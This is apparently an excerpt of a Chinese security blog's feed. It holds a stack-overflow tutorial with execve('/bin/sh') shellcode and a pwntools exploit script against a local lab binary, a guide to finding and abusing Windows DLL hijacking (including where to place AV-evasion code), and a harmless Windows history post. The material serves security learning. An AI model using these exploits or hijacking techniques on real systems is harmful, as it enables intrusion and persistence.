</span><br><span class="line">|        ret       |         |            |    shellcode     |</span><br><span class="line">+------------------+       高地址          +------------------+ </span><br></pre></td></tr></table></figure><hr><h5 id="找出溢出值"><a href="#找出溢出值" class="headerlink" title="找出溢出值"></a>找出溢出值</h5><p>首先开始确定程序溢出的字符串大小，我们先创建200个字符</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br></pre></td></tr></table></figure><p>运行后程序奔溃，EIP被覆盖了，显示错误值为<code>0x6261616b(kkab)</code></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/8.png?raw=true" alt="image-20201117143016927"></p><p>然后我们用cyclic就能看到溢出的字符串大小了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l 0x6261616b</span><br><span class="line">140</span><br></pre></td></tr></table></figure><hr><h5 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h5><p>接着制作一个shellcode，直接使用汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">; shellcode.asm</span><br><span class="line">; execve (&quot;&#x2F;bin&#x2F;sh&quot;) 汇编原形</span><br><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">xor eax, eax</span><br><span class="line">push eax        ;&quot;\x00&quot;</span><br><span class="line">push 0x68732f2f ;&quot;&#x2F;&#x2F;sh&quot; 入栈</span><br><span class="line">push 0x6e69622f ;&quot;&#x2F;bin&quot; 入栈</span><br><span class="line">mov ebx, esp    ;ebx&#x3D;esp &quot;&#x2F;bin&#x2F;&#x2F;sh&quot;的地址</span><br><span class="line">push eax        ;&quot;\x00&quot; 入栈</span><br><span class="line">push ebx        ;&quot;&#x2F;bin&#x2F;&#x2F;sh&quot;地址入栈</span><br><span class="line">mov ecx, esp    ;ecx&#x3D;esp  为指针数组地址</span><br><span class="line">xor edx, edx    ;edx&#x3D;0</span><br><span class="line">mov al, 11      ;al&#x3D;11   execve的系统调用号</span><br><span class="line">int 0x80        ;软中断指令</span><br></pre></td></tr></table></figure><p>如果不确定汇编能不能用可以编译然后运行试试</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf shellcode.asm</span><br><span class="line">ld -m elf_i386 -o shellcode shellcode.o <span class="comment">#编译的是32位的汇编</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/9.png?raw=true" alt="image-20201117203411240"></p><p>接着我们要把汇编代码转换成SHELLCODE，有好几种方法，这边就提三种</p><ul><li><p>使用rasm2把汇编代码转换为C的shellcode，转换的时候只需要shellcode.asm文件<code>_start:</code>后面的内容</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ascotbe:~<span class="comment"># rasm2 -a x86 -b 32 -f shellcode.asm -C</span></span><br><span class="line"><span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span> \</span><br><span class="line"><span class="string">&quot;\xd2\xb0\x0b\xcd\x80&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>使用pwntools进行转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shellcode.py</span></span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line">pwn.context.arch      = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">pwn.context.os        = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">pwn.context.endian    = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">pwn.context.word_size = <span class="number">32</span></span><br><span class="line">shellcode = pwn.asm(<span class="string">&quot;xor eax, eax&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push eax&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push 0x68732f2f&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push 0x6e69622f&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;mov ebx, esp&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push eax&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push ebx&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;mov ecx, esp&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;xor edx, edx&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;mov al, 11&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;int 0x80&quot;</span>)</span><br><span class="line">print(shellcode.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p>运行Python脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ascotbe:~<span class="comment"># python3 shellcode.py</span></span><br><span class="line">31c050682f2f7368682f62696e89e3505389e131d2b00bcd80</span><br></pre></td></tr></table></figure></li><li><p>使用pwntools内置的汇编</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">print(shellcode)</span><br></pre></td></tr></table></figure></li></ul><hr><h5 id="寻找返回地址"><a href="#寻找返回地址" class="headerlink" title="寻找返回地址"></a>寻找返回地址</h5><p>由于gdb的调试环境会影响<strong>buf</strong>在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行<code>./level1</code>的时候，<strong>buf</strong>的位置会固定在别的地址上。</p><p>所以需要开启core dump功能，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/kernel/core_uses_pid</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/corefiles/core-%e-%p-%t&#x27;</span> &gt; /proc/sys/kernel/core_pattern</span><br><span class="line"><span class="built_in">ulimit</span> -c unlimited</span><br><span class="line">sudo sh -c <span class="string">&#x27;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span></span><br></pre></td></tr></table></figure><p>接着进行调试</p><p><strong>注意：如果重启机器关闭的ASLR或者开启的core dump都会关闭了</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop/Pwn$ ./level1 </span><br><span class="line">AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line">段错误 (核心已转储)</span><br><span class="line">kali@kali:~/Desktop/Pwn$ gdb ./level1 /tmp/core.1605753112.1826 </span><br><span class="line">Core was generated by `./level1<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">Program terminated with signal SIGSEGV, Segmentation fault.</span></span><br><span class="line"><span class="string">#0  0x41416d41 in ?? ()</span></span><br><span class="line"><span class="string">gdb-peda$ pattern offset 0x41416d41</span></span><br><span class="line"><span class="string">1094806849 found at offset: 140</span></span><br><span class="line"><span class="string">gdb-peda$ x/10s $esp-144</span></span><br><span class="line"><span class="string">0xffffd190:     &quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;...</span></span><br><span class="line"><span class="string">0xffffd225:     &quot;\n\264\374&quot;, &lt;incomplete sequence \367&gt;</span></span><br><span class="line"><span class="string">0xffffd226:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd227:     &quot;\373\367\001&quot;</span></span><br><span class="line"><span class="string">0xffffd228:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd229:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd22a:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd22b:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd22c:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd231:     &quot;&quot;</span></span><br></pre></td></tr></table></figure><p>因为溢出点是140个字节，再加上4个字节的ret地址，通过gdb的命令<code>x/10s $esp-144</code>，我们可以得到buf的地址为<strong>0xffffd190</strong>，然后利用脚本即可达到溢出执行命令的效果</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/10.png?raw=true" alt="image-20201119104715107"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./level1&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">ret = <span class="number">0xffffd190</span></span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span> </span><br><span class="line">shellcode+= <span class="string">b&quot;\xd2\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line">payload = shellcode + <span class="string">b&#x27;A&#x27;</span>*(<span class="number">140</span>-<span class="built_in">len</span>(shellcode)) + p32(ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>坑点</p></blockquote><p>用kali调试好像是有问题的，溢出的ret地址经常不对，最好用Ubuntu，立马删Kali！！</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;introspelliam.github.io&#x2F;2017&#x2F;09&#x2F;30&#x2F;linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;183370</span><br><span class="line">http:&#x2F;&#x2F;www.peckerwood.top&#x2F;post&#x2F;rop_0x01&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;blog.nsfocus.net&#x2F;easy-implement-shellcode-xiangjie&#x2F;</span><br><span class="line">《CTF竞赛权威指南》</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>恶意程序研究之DLL劫持</title>
    <link href="https://www.ascotbe.com/2020/11/13/DynamicLinkLibraryHijack/"/>
    <id>https://www.ascotbe.com/2020/11/13/DynamicLinkLibraryHijack/</id>
    <published>2020-11-13T07:45:42.000Z</published>
    <updated>2021-05-04T06:03:28.063Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><p>DLL劫持一直深受黑客们的喜欢，利用此技术可以实现启动木马后门，游戏外挂插件的注入，绕过UAC等操作。</p><p>全文约定：全文中系统盘所在的位置默认为C盘</p><h2 id="DLL加载顺序"><a href="#DLL加载顺序" class="headerlink" title="DLL加载顺序"></a>DLL加载顺序</h2><p>DLL是以文件的形式存在在硬盘中，那么应用程序又是如何索引所需的DLL呢？其实，Microsoft已在<a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">此处</a>完整记录了DLL搜索顺序。</p><blockquote><p>微软的DLL劫持分为三个阶段</p></blockquote><ul><li>无保护阶段：Windows XP SP2之前</li><li>保护阶段：Windows XP SP2之后，Windows 7之前</li><li>进一步保护阶段：Windows 7之后</li></ul><blockquote><h4 id="Windows-XP-SP2之前"><a href="#Windows-XP-SP2之前" class="headerlink" title="Windows XP SP2之前"></a>Windows XP SP2之前</h4></blockquote><ol><li>进程对应的应用程序所在目录；</li><li>加载 DLL 时所在的当前目录；</li><li>系统目录即 SYSTEM32 目录（通过 GetSystemDirectory 获取）；</li><li>16位系统目录即 SYSTEM 目录；</li><li>Windows目录（通过 GetWindowsDirectory 获取）；</li><li>PATH环境变量中的各个目录；</li></ol><blockquote><h4 id="Windows-XP-SP2之后"><a href="#Windows-XP-SP2之后" class="headerlink" title="Windows XP SP2之后"></a>Windows XP SP2之后</h4></blockquote><p>微软为了防止DLL劫持漏洞的产生，在XP SP2之后，添加了一个SafeDllSearchMode的注册表属性。注册表路径如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</span><br></pre></td></tr></table></figure><p>当SafeDllSearchMode的值设置为1，即安全DLL搜索模式开启时，查找DLL的目录顺序如下：</p><ol><li>应用程序所在目录；</li><li>系统目录SYSTEM32 目录；</li><li>16位系统目录即SYSTEM 目录。该项只是为了向前兼容的处理，可以不考虑；</li><li>Windows目录。通常是<strong>C:\Windows</strong>；</li><li>加载 DLL 时所在的当前目录；</li><li>环境变量<strong>PATH</strong>中所有目录。需要注意的是，这里不包括<strong>App Paths</strong>注册表项指定的应用程序路径。</li></ol><p><strong>PS：</strong>“安全DLL查找模式”默认是启用的</p><blockquote><h4 id="Windows-7之后"><a href="#Windows-7之后" class="headerlink" title="Windows 7之后"></a>Windows 7之后</h4></blockquote><p>微软为了更进一步的防御系统的DLL被劫持，将一些容易被劫持的系统DLL写进了一个注册表项中，<strong>那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用</strong>，而只能从系统目录即SYSTEM32目录下调用。注册表路径如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</span><br></pre></td></tr></table></figure><p>Windows 10中的如下</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DynamicLinkLibraryHijack/1.png?raw=true" alt="image-20200921151524382"></p><h2 id="如何寻找DLL劫持"><a href="#如何寻找DLL劫持" class="headerlink" title="如何寻找DLL劫持"></a>如何寻找DLL劫持</h2><blockquote><p>劫持系统DLL</p></blockquote><p>要分析一个应用程序是否存在劫持系统DLL的漏洞，需要这么几个步骤</p><ul><li>启动应用程序</li><li>使用Process Explorer等类似软件查看该应用程序启动后加载的动态链接库。</li><li>从该应用程序已经加载的DLL列表中，查找在上述“KnownDLLs注册表项”中不存在的DLL。</li><li>编写从上一步获取到的DLL的劫持DLL。</li><li>将编写好的劫持DLL放到该应用程序目录下，重新启动该应用程序，检测是否劫持成功。</li></ul><p>如果对以上步骤都没问题还是没有实现劫持的话，具体可能有一下情况</p><ul><li>DLL不在KnownDLLs注册表中但是已经被微软做了保护，比如ntdll.dll等系统核心dll</li><li>宿主进程在调用LoadLibrary函数时使用了“绝对路径”</li><li>宿主进程对调用的DLL进行了校检，比如文件MD5、HASH等值</li><li>宿主调用DLL时使用了SetDllDirectory函数把当前目录从DLL的搜索顺序列表中删除</li></ul><blockquote><p>劫持应用DLL</p></blockquote><p>劫持这个DLL就方便多了，只要宿主没有对自己的DLL做校检的话就可以进行劫持替换</p><h2 id="手动寻找"><a href="#手动寻找" class="headerlink" title="手动寻找"></a>手动寻找</h2><p>由于Windows 10做了很多限制，我们使用Windows 7来测试会方便很多，如果是新的Windows 7系统需要打个补丁，不然用不了Process Monitor</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.microsoft.com&#x2F;en-us&#x2F;download&#x2F;confirmation.aspx?id&#x3D;46148</span><br></pre></td></tr></table></figure><p>利用<code>NDP461-KB3102438-Web.exe</code>程序进行进行测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#微软下载地址</span><br><span class="line">http:&#x2F;&#x2F;www.microsoft.com&#x2F;zh-cn&#x2F;download&#x2F;details.aspx?id&#x3D;49981&amp;134b2bb0-86c1-fe9f-d523-281faef41695&#x3D;1&amp;fa43d42b-25b5-4a42-fe9b-1634f450f5ee&#x3D;True</span><br><span class="line">#备用下载地址</span><br><span class="line">XXX</span><br></pre></td></tr></table></figure><p>然后使用Process Monitor做如下设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Include the following filters:</span><br><span class="line">Operation is CreateFile</span><br><span class="line">Operation is LoadImage</span><br><span class="line">Path contains .cpl</span><br><span class="line">Path contains .dll</span><br><span class="line">Path contains .drv</span><br><span class="line">Path contains .exe</span><br><span class="line">Path contains .ocx</span><br><span class="line">Path contains .scr</span><br><span class="line">Path contains .sys</span><br><span class="line"></span><br><span class="line">Exclude the following filters:</span><br><span class="line">Process Name is procmon.exe</span><br><span class="line">Process Name is Procmon64.exe</span><br><span class="line">Process Name is System</span><br><span class="line">Process Name is not NDP461-KB3102438-Web.exe &#x2F;&#x2F;这个是你要测试的进程</span><br><span class="line">Operation begins with IRP_MJ_</span><br><span class="line">Operation begins with FASTIO_</span><br><span class="line">Result is SUCCESS</span><br><span class="line">Path ends with pagefile.sys</span><br></pre></td></tr></table></figure><p><strong>设置Exclude Result is SUCCESS后会只显示NAME NOT FOUND项，也就是只查看未成功加载的dll项，即KnownDLLs的列表中不包含的dll名称，可用于查找存在漏洞的dll路径</strong></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DynamicLinkLibraryHijack/2.png?raw=true" alt="image-20201113145850843"></p><p>可以看到<code>NDP461-KB3102438-Web.exe</code>在启动的过程中会加载下图中框起来的DLL，并且DLL的路径和这个进程在相同文件夹，同时显示<code>NAME NOT FOUND</code>，表示无法找到该文件，加载失败，这就说明这几个DLL是可以进行劫持的</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DynamicLinkLibraryHijack/3.png?raw=true" alt="image-20201113150057290"></p><h2 id="劫持测试"><a href="#劫持测试" class="headerlink" title="劫持测试"></a>劫持测试</h2><p>既然发现了劫持的DLL，我们就可以进程初步演示了，搞一个执行计算器的DLL然后把它改名为CRYPTSP.dll，接着运行程序即可达到劫持的作用</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DynamicLinkLibraryHijack/4.png?raw=true" alt="image-20201113151256951"></p><h2 id="实战化利用"><a href="#实战化利用" class="headerlink" title="实战化利用"></a>实战化利用</h2><p>如果动手过的小伙伴可以发现，如果我们吧CRYPTSP.dll的名称改成VERSION.dll的时候用来劫持的话，会发现报错。</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DynamicLinkLibraryHijack/5.png?raw=true" alt="image-20201113151835798"></p><p>主要的原因是测试DLL只有一个加载的时候执行计算器的函数，而并没有劫持目标上面的所有导出函数，所以当我们找到了一个可以劫持的DLL的时候，需要用脚本一键生成劫持cpp文件后进行编译，以下是对系统中的twain_32的一键生成方式的演示</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DynamicLinkLibraryHijack/6.png?raw=true" alt="image-20201113152556376"></p><p>导出后我们就可以把免杀代码放到这个位置然后编译即可</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DynamicLinkLibraryHijack/7.png?raw=true" alt="image-20201113152811232"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sensepost&#x2F;rattler</span><br><span class="line">https:&#x2F;&#x2F;3gstudent.github.io&#x2F;DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Windows杂谈</title>
    <link href="https://www.ascotbe.com/2020/11/02/WindowsTalk/"/>
    <id>https://www.ascotbe.com/2020/11/02/WindowsTalk/</id>
    <published>2020-11-02T10:45:42.000Z</published>
    <updated>2021-05-04T06:03:28.414Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言</p></blockquote><p>梳理Windows的历史</p><img src="https://github.com/Ascotbe/Random-img/blob/master/HardwareRelated/1.png?raw=true" alt="1" style="zoom:50%;" /><h3 id="Windows杂谈"><a href="#Windows杂谈" class="headerlink" title="Windows杂谈"></a>Windows杂谈</h3><p>微软于1985年11月20日推出了名为Windows的操作系统，作为MS-DOS的图形操作系统外壳，而MacOS是1984年推出的。并且Windows 10是微软最后一个版本的操作系统，不在会有像Windows 7 和Windows 7 sp1 或者sp2这种升级，而是统一使用Windows 10 1507这样的编号。</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HardwareRelated/2.png?raw=true" alt="image-20201102145353213"> </p><h3 id="Windows内核区别"><a href="#Windows内核区别" class="headerlink" title="Windows内核区别"></a>Windows内核区别</h3><blockquote><h4 id="MS-DOS"><a href="#MS-DOS" class="headerlink" title="MS-DOS"></a>MS-DOS</h4></blockquote><p>1980年，西雅图计算机产品公司的一名24岁的程序员Tim Paterson(蒂姆·帕特森)花费了四个月时间编写出了 86-DOS 操作系统。1981年7月，微软以五万美元的代价向西雅图公司购得本产品的全部著作权，并将它更名为 MS-DOS。</p><p>MS-DOS源码下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;computerhistory.org&#x2F;blogs&#x2F;microsoft-research-license-agreement-msdos-v1-1-v2-0&#x2F;</span><br></pre></td></tr></table></figure><blockquote><h4 id="Windows-95"><a href="#Windows-95" class="headerlink" title="Windows 95"></a>Windows 95</h4></blockquote><p>Windows 95是微软公司于1995年推出的电脑操作系统。Windows 95是一个混合的16位/32位Windows系统，其版本号为4.0，开发代号为Chicago。Windows 95是微软之前独立的操作系统MS-DOS和Microsoft Windows的直接后续版本。</p><p>Windows 95共有五种版本：</p><ul><li>Windows 95 零售版（发布日期1995年8月24日）</li><li>Windows 95 OEM Service Release 1（OSR1）（发布日期1996年2月14日，包括 Windows 95 Service Pack 1）</li><li>Windows 95 OEM Service Release 2（OSR2）（发布日期1996年8月24日，包括一些改良例如IE 3.0和FAT32的支持）</li><li>Windows 95 OEM Service Release 2.1（OSR2.1）（发布日期1997年8月24日，包括基本USB支持）</li><li>Windows 95 OEM Service Release 2.5（OSR2.5）（发布日期1997年11月26日，包括以上版本多所有功能，另附IE 4.0与DirectX 5.0）</li></ul><blockquote><h4 id="Windows-Embedded-Compact"><a href="#Windows-Embedded-Compact" class="headerlink" title="Windows Embedded Compact"></a>Windows Embedded Compact</h4></blockquote><p>Windows CE 1.0最早于1996年推出，是单色的<strong>Windows 95</strong>内核简化版本。</p><p>Windows CE 3.0是微软的Windows Compact Edition，已摆脱旧有的Windows 95简化格式，是一套全新的操作系统，支持5种CPU：x86、PowerPC、ARM、MIPS、SH3/4。</p><p>目前已经更新到Windows CE 7.0</p><p>Windows CE可以使用在各式各样的系统上，最有名的是Pocket PC以及微软的SmartPhone。其他较不为人知的设备包括微软的车载电脑、机顶盒、生产在线的控制设备、公共场所的信息站、电子辞典及导航仪等等，有些设备甚至没有任何人机界面。</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HardwareRelated/3.png?raw=true" alt="Timeline of Windows CE Development"></p><p align="center" >截止2007年数据（2011年已使用CE 7.0内核）</p><blockquote><h4 id="Windows-New-Technology"><a href="#Windows-New-Technology" class="headerlink" title="Windows New Technology"></a>Windows New Technology</h4></blockquote><p><strong>Windows NT</strong>，<strong>新技术视窗操作系统</strong>（Windows New Technology）的简称，是微软公司1993年推出的纯32位操作系统核心。截止2020年最新内核版本为NT 10</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HardwareRelated/4.png?raw=true" alt="img"></p><h3 id="Windows版本历史"><a href="#Windows版本历史" class="headerlink" title="Windows版本历史"></a>Windows版本历史</h3><blockquote><h4 id="以-DOS-为基础的-Windows"><a href="#以-DOS-为基础的-Windows" class="headerlink" title="以 DOS 为基础的 Windows"></a>以 DOS 为基础的 Windows</h4></blockquote><p>早期版本的Windows通常被看作仅仅是运行于MS-DOS系统中的一个图形用户界面，不是操作系统。16位版本的Windows包括<strong>Windows 1.0</strong>、<strong>Windows 2.0</strong>及最後版本<strong>Windows 3.X</strong>。</p><blockquote><h4 id="以-Windows-9x-为基础的-Windows"><a href="#以-Windows-9x-为基础的-Windows" class="headerlink" title="以 Windows 9x 为基础的 Windows"></a>以 Windows 9x 为基础的 Windows</h4></blockquote><p><strong>Windows 9x</strong>是<strong>Windows 95</strong>、<strong>Windows 98</strong>、<strong>Windows ME</strong>等以 <strong>Windows 95</strong>内核作为参考的微软操作系统通称，与 <strong>Windows NT</strong>分离于两个开发路线。它是一种多任务图形方式的操作系统。</p><p>Windows 9x 仍然需要依赖16位的DOS基层程式才能运行，不算是真正意义上的32位操作系统，由于使用DOS代码，架构也与16位DOS一样，核心属于单核心，但也引入了部分32位作業系統的特性，具有一定的32位的处理能力。</p><blockquote><h4 id="以-Windows-NT-内核为基础的-Windows"><a href="#以-Windows-NT-内核为基础的-Windows" class="headerlink" title="以 Windows NT 内核为基础的 Windows"></a>以 Windows NT 内核为基础的 Windows</h4></blockquote><h5 id="32位元操作系统"><a href="#32位元操作系统" 